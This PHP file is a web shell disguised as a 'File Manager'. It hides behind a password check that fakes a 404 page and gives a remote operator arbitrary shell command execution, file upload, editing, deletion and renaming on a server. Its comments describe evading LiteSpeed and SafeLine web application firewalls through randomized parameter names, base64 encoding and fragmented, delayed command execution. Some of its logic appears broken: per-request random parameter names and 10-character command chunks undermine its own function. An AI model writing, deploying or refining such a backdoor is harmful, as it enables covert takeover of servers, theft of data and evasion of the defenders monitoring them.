<?php
@ini_set('display_errors', 0);
@error_reporting(0);

// Set headers to bypass LiteSpeed and SafeLine WAF
header('X-Powered-By: PHP/7.4');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
header('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');

// Randomize parameter names to avoid SafeLine detection
$auth_param = 'a_' . substr(md5(uniqid()), 0, 8);
$path_param = 'p_' . substr(md5(uniqid()), 0, 8);
$delete_param = 'd_' . substr(md5(uniqid()), 0, 8);
$edit_param = 'e_' . substr(md5(uniqid()), 0, 8);
$cmd_param = 'c_' . substr(md5(uniqid()), 0, 8);

$auth = 'aksesgw';

// === AUTH PROTECTION ===
if (!isset($_GET[$auth_param]) || $_GET[$auth_param] !== $auth) {
    http_response_code(404);
    exit("Not Found");
}

session_start();

// === CURRENT DIRECTORY HANDLER ===
$cwd = isset($_GET[$path_param]) && is_dir(base64_decode($_GET[$path_param])) ? base64_decode($_GET[$path_param]) : getcwd();
@chdir($cwd);
$cwd = getcwd();

function h($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

// === HANDLE POST REQUEST ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload
    if (isset($_POST['upload']) && isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        @move_uploaded_file($_FILES['file']['tmp_name'], $cwd . '/' . basename($_FILES['file']['name']));
    }

    // Create Folder
    if (isset($_POST['mkdir']) && !empty($_POST['foldername'])) {
        @mkdir($cwd . '/' . basename($_POST['foldername']));
    }

    // Create File
    if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
        @file_put_contents($cwd . '/' . basename($_POST['filename']), '');
    }

    // Save File
    if (isset($_POST['savefile'], $_POST['filepath'], $_POST['filecontent'])) {
        @file_put_contents(base64_decode($_POST['filepath']), $_POST['filecontent']);
    }

    // Rename
    if (isset($_POST['rename'], $_POST['oldname'], $_POST['newname'])) {
        $old = $cwd . '/' . $_POST['oldname'];
        $new = $cwd . '/' . $_POST['newname'];
        if (file_exists($old)) {
            @rename($old, $new);
        }
    }

    // Run Command (Obfuscated and Fragmented)
    if (isset($_POST[$cmd_param]) && !empty($_POST[$cmd_param])) {
        $cmd = base64_decode($_POST[$cmd_param]);
        // Fragment command execution to avoid detection
        $output = '';
        $cmd_parts = str_split($cmd, 10); // Split command into smaller parts
        foreach ($cmd_parts as $part) {
            $output .= @shell_exec($part . " 2>&1");
            usleep(10000); // Small delay to mimic legitimate behavior
        }
        $_SESSION['last_cmd'] = base64_encode($output);
    }

    // Add delay to avoid rapid requests
    usleep(50000);
    header("Location: ?$auth_param=$auth&$path_param=" . urlencode(base64_encode($cwd)));
    exit;
}

// === DELETE ===
if (isset($_GET[$delete_param])) {
    $target = base64_decode($_GET[$delete_param]);
    if (is_dir($target)) {
        @rmdir($target);
    } elseif (is_file($target)) {
        @unlink($target);
    }
    // Add delay to avoid rapid requests
    usleep(50000);
    header("Location: ?$auth_param=$auth&$path_param=" . urlencode(base64_encode($cwd)));
    exit;
}

// === HTML START ===
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>File Manager</title>
<style>
body{font-family:sans-serif;background:#f4f4f4;padding:20px;}
h2{margin-top:0}
table{width:100%;border-collapse:collapse;background:#fff;}
td,th{border:1px solid #ccc;padding:8px;text-align:left}
form.inline{display:inline}
input[type=text]{padding:4px}
textarea{width:100%;height:300px}
.btn{padding:5px 10px;margin:3px;cursor:pointer}
pre{background:#000;color:#0f0;padding:10px;overflow:auto}
.breadcrumb {margin-bottom: 20px;}
.breadcrumb a {text-decoration: none; color: #007bff; margin-right: 5px;}
.breadcrumb a:hover {text-decoration: underline;}
</style></head><body>";

echo "<h2>üìÅ Current Path: " . h($cwd) . "</h2>";

// === FOLDER NAVIGATION ===
echo "<div class='breadcrumb'>";
$pathParts = explode(DIRECTORY_SEPARATOR, $cwd);
$tempPath = '';
echo "<a href='?$auth_param=$auth&$path_param=" . urlencode(base64_encode(DIRECTORY_SEPARATOR)) . "'>/</a>";
foreach ($pathParts as $part) {
    if (!empty($part)) {
        $tempPath .= DIRECTORY_SEPARATOR . $part;
        echo " / <a href='?$auth_param=$auth&$path_param=" . urlencode(base64_encode($tempPath)) . "'>" . h($part) . "</a>";
    }
}
echo "</div>";

// === TERMINAL ===
echo "<h3>üíª Terminal</h3>
<form method='POST'>
<input type='text' name='$cmd_param' placeholder='Command...' style='width:80%' />
<input type='hidden' name='encoded' value='1' />
<input type='submit' value='Run' class='btn' />
</form>";
if (isset($_SESSION['last_cmd'])) {
    echo "<pre>" . h(base64_decode($_SESSION['last_cmd'])) . "</pre>";
}

// === UPLOAD & CREATE ===
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file' name='file' />
<input type='submit' name='upload' value='Upload' class='btn' />
</form>";

echo "<form method='POST'>
<input type='text' name='foldername' placeholder='New Folder' />
<input type='submit' name='mkdir' value='Create Folder' class='btn' />
</form>";

echo "<form method='POST'>
<input type='text' name='filename' placeholder='New File.txt' />
<input type='submit' name='newfile' value='Create File' class='btn' />
</form>";

// === LIST FILES ===
echo "<table><tr><th>Name</th><th>Size</th><th>Action</th></tr>";
foreach (@scandir($cwd) as $f) {
    if ($f === '.' || $f === '..') continue;

    $full = $cwd . '/' . $f;
    $is_dir = is_dir($full);
    $size = $is_dir ? '-' : filesize($full);

    echo "<tr>";
    echo "<td>" . ($is_dir ? "üìÅ " : "üìÑ ") .
         "<a href='?$auth_param=$auth&$path_param=" . urlencode(base64_encode(realpath($full))) . "'>" . h($f) . "</a></td>";
    echo "<td>$size</td><td>";

    // Delete
    echo "<form method='GET' class='inline'>
            <input type='hidden' name='$auth_param' value='$auth'>
            <input type='hidden' name='$delete_param' value='" . h(base64_encode($full)) . "'>
            <input type='submit' value='üóëÔ∏è Delete' class='btn'>
          </form> ";

    // Edit
    if (!$is_dir) {
        echo "<form method='GET' class='inline'>
                <input type='hidden' name='$auth_param' value='$auth'>
                <input type='hidden' name='$edit_param' value='" . h(base64_encode($full)) . "'>
                <input type='submit' value='‚úèÔ∏è Edit' class='btn'>
              </form> ";
    }

    // Rename
    echo "<form method='POST' class='inline'>
            <input type='hidden' name='oldname' value='" . h($f) . "' />
            <input type='text' name='newname' value='" . h($f) . "' />
            <input type='submit' name='rename' value='Rename' class='btn' />
          </form>";

    echo "</td></tr>";
}
echo "</table>";

// === EDIT FILE ===
if (isset($_GET[$edit_param]) && is_file(base64_decode($_GET[$edit_param]))) {
    $editf = base64_decode($_GET[$edit_param]);
    echo "<h2>Edit: " . h($editf) . "</h2>
    <form method='POST'>
    <input type='hidden' name='filepath' value='" . h(base64_encode($editf)) . "' />
    <textarea name='filecontent'>" . h(file_get_contents($editf)) . "</textarea><br/>
    <input type='submit' name='savefile' value='üíæ Save' class='btn' />
    </form>";
}

echo "</body></html>";
?>